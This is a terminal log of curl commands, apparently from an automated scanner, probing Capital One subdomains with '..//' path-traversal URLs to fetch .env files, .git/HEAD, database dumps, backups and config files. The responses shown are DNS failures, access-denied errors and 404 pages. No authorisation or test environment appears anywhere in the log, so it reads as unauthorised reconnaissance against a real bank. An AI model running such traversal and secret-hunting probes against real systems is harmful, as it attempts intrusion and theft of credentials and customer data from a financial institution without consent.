$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session/..//backup.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session/..//database.sql'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session/..//config.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session/..//.env'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status/..//.git/HEAD'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    126      0 --:--:-- --:--:-- --:--:--   126100   111    0   111    0     0    126      0 --:--:-- --:--:-- --:--:--   126
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status/..//backup.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    126      0 --:--:-- --:--:-- --:--:--   126100   111    0   111    0     0    126      0 --:--:-- --:--:-- --:--:--   126
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status/..//database.sql'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    115      0 --:--:-- --:--:-- --:--:--   115100   111    0   111    0     0    115      0 --:--:-- --:--:-- --:--:--   115
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status/..//config.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    125      0 --:--:-- --:--:-- --:--:--   125100   111    0   111    0     0    125      0 --:--:-- --:--:-- --:--:--   125
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status/..//.env'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    113      0 --:--:-- --:--:-- --:--:--   113100   111    0   111    0     0    113      0 --:--:-- --:--:-- --:--:--   113
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets/..//.git/HEAD'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets/..//backup.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets/..//database.sql'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets/..//config.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets/..//.env'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config/..//.git/HEAD'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   1195      0 --:--:-- --:--:-- --:--:--  1193100   721    0   721    0     0   1194      0 --:--:-- --:--:-- --:--:--  1193
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config/..//backup.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    152      0 --:--:-- --:--:-- --:--:--   152
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config/..//database.sql'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    152      0 --:--:-- --:--:-- --:--:--   152
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config/..//config.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   3346      0 --:--:-- --:--:-- --:--:--  3353
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config/..//.env'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   2643      0 --:--:-- --:--:-- --:--:--  2650
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth/..//.git/HEAD'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth/..//backup.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth/..//database.sql'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth/..//config.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth/..//.env'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
